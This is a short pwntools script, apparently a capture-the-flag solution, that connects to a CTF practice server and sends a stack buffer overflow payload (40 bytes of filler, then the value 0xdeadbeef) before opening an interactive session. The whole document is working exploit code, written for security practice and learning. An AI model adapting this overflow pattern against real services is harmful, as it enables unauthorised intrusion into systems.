from pwn import *

#remote setting
r = remote("ctf.j0n9hyun.xyz", 3000)
context.log_level = 'debug'

#set pyaload
payload = ""
payload += "A"*40 #buffer size
payload += p32(0xdeadbeef) + "AAAA" #key and dummy
log.info("payload = " + payload)

#send
r.sendline(payload)

#get control
r.interactive()
